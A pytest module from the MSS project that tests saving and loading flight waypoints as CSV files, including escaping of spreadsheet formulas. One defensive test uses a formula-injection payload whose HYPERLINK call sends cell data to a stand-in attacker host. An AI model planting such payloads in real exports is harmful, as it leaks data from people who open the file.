# -*- coding: utf-8 -*-
"""

    tests._test_plugins.test_io_csv
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    This module provides pytest functions to test mslib.plugins.io.csv

    This file is part of MSS.

    :copyright: Copyright 2022-2022 Reimar Bauer
    :copyright: Copyright 2022-2026 by the MSS team, see AUTHORS.
    :license: APACHE-2.0, see LICENSE for details.

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
"""
import csv as std_csv
import os

import mslib.msui.flighttrack as ft
from tests.constants import ROOT_DIR
from mslib.plugins.io import csv


def test_save_to_csv():
    try:
        filename = os.path.join(ROOT_DIR, "testdata.csv")
        wp = _example_waypoints()
        name = "testdata"
        csv.save_to_csv(filename, name, wp)
        with open(filename) as f:
            data = f.readlines()
        assert data == ['testdata\n',
                        'Index;Location;Lat (+-90);Lon (+-180);Flightlevel;Pressure (hPa);Leg dist. '
                        '(km);Cum. dist. (km);Comments\n',
                        '0;Anchorage;61.168;-149.960;350.000;238.416;0.000;0.000;start\n',
                        '1;Adak;51.878;-176.646;350.000;238.416;0.000;0.000;last\n'
                        ]
    finally:
        if os.path.exists(filename):
            os.remove(filename)


def test_load_from_csv():
    data = ['testreaddata\n',
            'Index;Location;Lat (+-90);Lon (+-180);Flightlevel;Pressure (hPa);Leg dist. '
            '(km);Cum. dist. (km);Comments\n',
            '0;Anchorage;61.168;-149.960;350.000;238.416;0.000;0.000;start\n',
            '1;Adak;51.878;-176.646;350.000;238.416;0.000;0.000;last\n'
            ]
    filename = os.path.join(ROOT_DIR, "testreaddata.csv")
    with open(filename, 'w') as f:
        f.writelines(data)
    name, wp = csv.load_from_csv(filename)
    assert name == "testreaddata"
    assert wp[0].location == "Anchorage"
    assert wp[0].comments == "start"
    assert wp[1].location == "Adak"
    assert wp[1].comments == "last"


def _example_waypoints():
    return [ft.Waypoint(lat=61.168, lon=-149.960, flightlevel=350, location="Anchorage", comments="start"),
            ft.Waypoint(lat=51.878, lon=-176.646, flightlevel=350, location="Adak", comments="last")]


def test_save_to_csv_keeps_formulas_text(tmp_path):
    # names and comments are chosen by collaborators; a spreadsheet program must not run them as formulas
    texts = ['=HYPERLINK("http://attacker.example/?"&A1,"click")', "+1+1", "-1+1", "@SUM(1)", "\tTab", "\rCR",
             "'=already quoted"]
    waypoints = [ft.Waypoint(lat=61.168, lon=-149.960, flightlevel=350, location=text, comments=text)
                 for text in texts]
    filename = tmp_path / "formulas.csv"
    csv.save_to_csv(str(filename), "=1+1", waypoints)
    with open(filename, newline="") as f:
        rows = list(std_csv.reader(f, delimiter=";"))
    assert rows[0] == ["'=1+1"]
    for row, text in zip(rows[2:], texts):
        assert row[1] == row[8] == "'" + text
        # numbers stay numbers
        assert row[3] == "-149.960"
    # loading gives the original texts back
    _, loaded = csv.load_from_csv(str(filename))
    assert [(wp.location, wp.comments) for wp in loaded] == [(text, text) for text in texts]


def test_load_from_csv_keeps_other_quotes(tmp_path):
    # only a "'" in front of a formula character is removed
    filename = tmp_path / "quotes.csv"
    filename.write_text("quotes\n"
                        "Index;Location;Lat (+-90);Lon (+-180);Flightlevel;Pressure (hPa);Leg dist. (km);"
                        "Cum. dist. (km);Comments\n"
                        "0;'Anchorage;61.168;-149.960;350.000;238.416;0.000;0.000;''=x\n"
                        "1;Adak;51.878;-176.646;350.000;238.416;0.000;0.000;last\n")
    _, loaded = csv.load_from_csv(str(filename))
    assert (loaded[0].location, loaded[0].comments) == ("'Anchorage", "'=x")
